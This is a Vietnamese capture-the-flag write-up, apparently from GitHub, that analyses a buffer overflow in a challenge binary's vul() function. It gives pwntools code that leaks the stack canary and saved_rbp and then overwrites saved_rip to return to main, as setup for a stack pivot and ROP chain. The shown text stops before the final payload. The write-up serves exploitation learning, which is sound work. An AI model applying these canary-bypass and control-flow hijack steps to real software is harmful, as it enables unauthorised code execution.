# Phân tích code
 
 <img width="787" height="606" alt="image" src="https://github.com/user-attachments/assets/012c2e18-28cb-41dd-ac5c-4c0b19162389" />

Lỗi buffer overflow nằm trong hàm vul().
Và vòng for chỉ cho phép thực hiện 5 nằm động trước khi ret.

<img width="1127" height="425" alt="image" src="https://github.com/user-attachments/assets/dcabfb1a-dcdf-4a8a-bd9c-f7d6349fa07e" />

Kiểm tra trong stack thì 24 BYTE cuối có thể ghi đè lần lượt là canary, saved_rbp và saved_rip.
Trong stack không có chỗ để chứa ROPchain gọi system nên cần dùng stack pivot để chuyển hướng đến địa chỉ khác chứa ROPchain.
Phù hợp nhất là leak stack (saved_rbp) để tính offset đến buffer và nhập system vào ở hành động sau để thực thực thi.

Nhưng vì có Canary nên cần leak Canary để bypass trước:

    p.sendlineafter(b'>', b'1')
    p.sendafter(b'Please enter some data:\n> ',b'A'*265) // nhập dữ liệu ghi đè byte NULL của canary
    p.sendlineafter(b'>',b'2')
    p.recvuntil(b'A'*265)
    canary=u64(b'\0'+p.recv(7))  // Lấy 7 byte của Canary bỏ đi byte A
    log.info('canary: '+hex(canary))

Tiếp theo là leak địa chỉ stack:

    p.sendlineafter(b'>',b'1')
    p.sendafter(b'Please enter some data:\n> ',b'A'*272)
    p.sendlineafter(b'>', b'2')
    p.recvuntil(b'A'*272)
    leak_rbp=u64(p.recv(6)+b'\x00\x00')
    log.info('leak_rbp: '+hex(leak_rbp))

Leak Canary và Stack đã tiêu tốn hết 4 hành động (2 lần read và 2 lần write). Chỉ với 1 hành động không thể leak libc và ghi đè payload nên 
giải pháp hiện tại là dùng 1 lần hành động còn lại để gọi địa chỉ quay lại hàm main. 

Ghi đè địa chỉ main() vào saved_rip:

    payload=b'A'*264
    payload+=p64(canary)   //dùng Canary đã leak để bypass
    payload+=p64(0x404088)
    payload+=p64(exe.sym['main']+8)
    p.sendlineafter(b'>',b'1')
    p.sendafter(b'Please enter some data:\n> ',payload)

